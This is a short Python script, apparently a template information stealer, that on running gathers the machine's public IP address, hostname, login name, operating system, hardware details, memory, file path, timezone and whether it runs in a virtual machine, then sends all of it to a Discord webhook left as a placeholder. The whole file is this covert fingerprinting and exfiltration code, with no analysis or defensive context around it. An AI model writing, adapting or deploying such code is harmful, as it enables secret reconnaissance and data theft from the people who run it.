from requests import get
from discord_webhook import DiscordEmbed,DiscordWebhook
import platform
from platform import uname
import os
import sys
import time
import wmi
import psutil
import datetime
c = wmi.WMI()   
my_system = c.Win32_ComputerSystem()[0]
time2 = time.time()
sr = uname()
now = datetime.datetime.now()
local_now = now.astimezone()
local_tz = local_now.tzinfo
local_tzname = local_tz.tzname(local_now)
if hasattr(sys, 'real_prefix'):
    st = True
else:
     st = False

        
        
        
        
DISCORD_WEBHOOK = "YOUR WEBHOOK LINK"




def sg():

 ip = get('https://api.ipify.org').text 
 webhook = DiscordWebhook(url=DISCORD_WEBHOOK)
 embed = DiscordEmbed(title="PT-H14", description="**User (Device)**", color=0xfff700) 
 embed.set_author(name="ST", icon_url="https://www.shareicon.net/data/512x512/2015/09/28/647652_watch_512x512.png") 
 embed.set_thumbnail(url="https://www.blackhatwisdom.com/wp-content/uploads/2016/10/black-hat-wisdom-logo-2.png") 
 embed.add_embed_field(name="IP :", value=ip, inline=True) 
 embed.add_embed_field(name="Hostname, Device :", value=f"{platform.node()}", inline=True)
 embed.add_embed_field(name="ETC :", value=f"{uname()}".replace("uname_result","").replace(")","").replace("(",""), inline=True) 
 embed.add_embed_field(name="User :",value=f" {os.getlogin()} ")
 embed.add_embed_field(name="Operating system :",value=f" {platform.system()}")
 embed.add_embed_field(name="Virtual Machine :",value=f" {st}")
 embed.add_embed_field(name="Manufacturer :",value=f" {my_system.Manufacturer}")
 embed.add_embed_field(name="Model :",value=f" {my_system. Model}")
 embed.add_embed_field(name="NumberOfProcessors :",value=f" {my_system.NumberOfProcessors}")
 embed.add_embed_field(name="SystemType :",value=f" {my_system.SystemType}")
 embed.add_embed_field(name="SystemFamily :",value=f" {my_system.SystemFamily}")
 embed.add_embed_field(name="Memory :",value=f" {psutil.virtual_memory()}")
 embed.add_embed_field(name="Path :", value=f"**{sys.argv[0]}**", inline=True)
 embed.add_embed_field(name="Local Timezone :", value=f"**{local_tzname}**", inline=True)
 embed.set_footer(text=f"{time2}", icon_url="https://static.thenounproject.com/png/2256517-200.png")
 webhook.add_embed(embed)
 response = webhook.execute()


if __name__ == "__main__":
 sg()

